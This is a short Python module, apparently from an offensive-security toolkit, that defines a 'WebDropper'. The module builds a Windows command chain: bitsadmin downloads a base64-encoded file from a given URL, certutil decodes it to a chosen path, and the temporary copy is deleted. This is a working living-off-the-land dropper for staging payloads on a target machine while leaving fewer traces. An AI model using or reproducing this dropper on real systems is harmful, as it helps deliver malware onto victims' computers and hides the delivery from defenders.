from lets.__module__ import Module
import os


class WebDropper(Module):
    """
    Download a web resource using bitsadmin and certutil.

    NOTE: The web resource must be base64 encoded!
    """

    @classmethod
    def add_arguments(self, parser):
        parser.add_argument("url", type=str,
            help="url of web resource")
        parser.add_argument("path", type=str,
            help="download location")
        parser.add_argument("-j", "--job", type=str, default="test",
            help="name of transfer job (%(default)s)")

    def handle(self, input, url, path, job="test"):
        
        # Temporary file
        fpath = os.path.extsep.join([path, "b64"])

        # Construct command
        cmd  = " && ".join([

            # Download to temporary file
            "bitsadmin /Transfer %s %s %s" % (job, url, fpath),

            # Decode temporary file
            "certutil -f -decode %s %s" % (fpath, path),

            # Delete temporary file
            "del %s" % (fpath),
        ])
        
        self.log.warning("NOTE: The web resource must be base64 encoded!")
        yield cmd.encode()
